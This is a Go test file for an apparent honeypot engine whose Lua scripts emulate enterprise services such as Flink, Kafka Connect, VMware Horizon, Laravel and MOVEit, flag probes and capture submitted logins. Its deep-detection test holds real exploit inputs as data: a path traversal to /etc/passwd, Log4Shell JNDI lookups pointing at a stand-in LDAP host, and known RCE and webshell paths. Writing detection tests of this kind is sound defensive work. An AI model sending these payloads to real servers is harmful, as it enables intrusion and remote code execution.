package luaengine

import "testing"

// Behavior checks for the 10 enterprise / appliance / big-data personas added in
// the eleventh Lua expansion: each flags its signature probe and answers.
func TestNewScripts11CaptureBehavior(t *testing.T) {
	cases := []struct{ name, input, wantFlag string }{
		{"hadoop-yarn.lua", "GET /ws/v1/cluster HTTP/1.1\r\nHost: x\r\n\r\n", "hadoop-yarn-rm-probe"},
		{"flink.lua", "GET /jobmanager/config HTTP/1.1\r\nHost: x\r\n\r\n", "flink-dashboard-probe"},
		{"kafka-connect.lua", "GET /connectors HTTP/1.1\r\nHost: x\r\n\r\n", "kafka-connect-probe"},
		{"veeam.lua", "GET /api/v1/serverInfo HTTP/1.1\r\nHost: x\r\n\r\n", "veeam-probe"},
		{"vmware-horizon.lua", "GET /portal/ HTTP/1.1\r\nHost: x\r\n\r\n", "vmware-horizon-probe"},
		{"atlassian-crowd.lua", "GET /crowd/console/ HTTP/1.1\r\nHost: x\r\n\r\n", "crowd-probe"},
		{"draytek-vigor.lua", "GET /weblogin.htm HTTP/1.1\r\nHost: x\r\n\r\n", "draytek-probe"},
		{"gocd.lua", "GET /go/api/version HTTP/1.1\r\nHost: x\r\n\r\n", "gocd-probe"},
		{"laravel.lua", "GET /.env HTTP/1.1\r\nHost: x\r\n\r\n", "laravel-env-probe"},
		{"moveit.lua", "GET /api/v1/folders HTTP/1.1\r\nHost: x\r\n\r\n", "moveit-api-probe"},
	}
	if len(cases) != 10 {
		t.Fatalf("expected 10 new personas, have %d", len(cases))
	}
	for _, c := range cases {
		anoms, _, banner := runScriptFile(t, c.name, c.input)
		if !hasFlag(anoms, c.wantFlag) {
			t.Errorf("%s: expected flag %q; anomalies=%v", c.name, c.wantFlag, anoms)
		}
		if banner == "" {
			t.Errorf("%s: expected a response banner", c.name)
		}
	}
}

// The deep branches must recognize the specific exploit/abuse on each persona.
func TestNewScripts11DeepDetections(t *testing.T) {
	cases := []struct{ name, input, wantFlag string }{
		{"flink.lua",
			"GET /jobmanager/logs/..%252f..%252fetc%252fpasswd HTTP/1.1\r\nHost: x\r\n\r\n",
			"flink-cve-2020-17519"},
		{"kafka-connect.lua",
			"POST /connectors HTTP/1.1\r\nContent-Length: 64\r\n\r\n{\"config\":{\"k\":\"${jndi:ldap://x/a}\"}}",
			"kafka-connect-cve-2023-25194"},
		{"vmware-horizon.lua",
			"GET /portal/info HTTP/1.1\r\nUser-Agent: ${jndi:ldap://x/a}\r\nHost: x\r\n\r\n",
			"vmware-horizon-log4shell"},
		{"atlassian-crowd.lua",
			"POST /crowd/admin/uploadplugin.action HTTP/1.1\r\nHost: x\r\n\r\n",
			"crowd-cve-2019-11580"},
		{"laravel.lua",
			"POST /_ignition/execute-solution HTTP/1.1\r\nHost: x\r\n\r\n",
			"laravel-cve-2021-3129"},
		{"moveit.lua",
			"GET /human2.aspx HTTP/1.1\r\nHost: x\r\n\r\n",
			"moveit-cl0p-webshell"},
	}
	for _, c := range cases {
		anoms, _, _ := runScriptFile(t, c.name, c.input)
		if !hasFlag(anoms, c.wantFlag) {
			t.Errorf("%s: expected flag %q; anomalies=%v", c.name, c.wantFlag, anoms)
		}
	}
}

// A login POST must capture the submitted credentials.
func TestNewScripts11CaptureLogin(t *testing.T) {
	_, meta, _ := runScriptFile(t, "veeam.lua",
		"POST /api/oauth2/token HTTP/1.1\r\nContent-Length: 64\r\n\r\ngrant_type=password&username=admin&password=Secret123")
	if meta["auth_user"] != "admin" || meta["auth_pass"] != "Secret123" {
		t.Errorf("veeam login not captured: user=%v pass=%v", meta["auth_user"], meta["auth_pass"])
	}
}
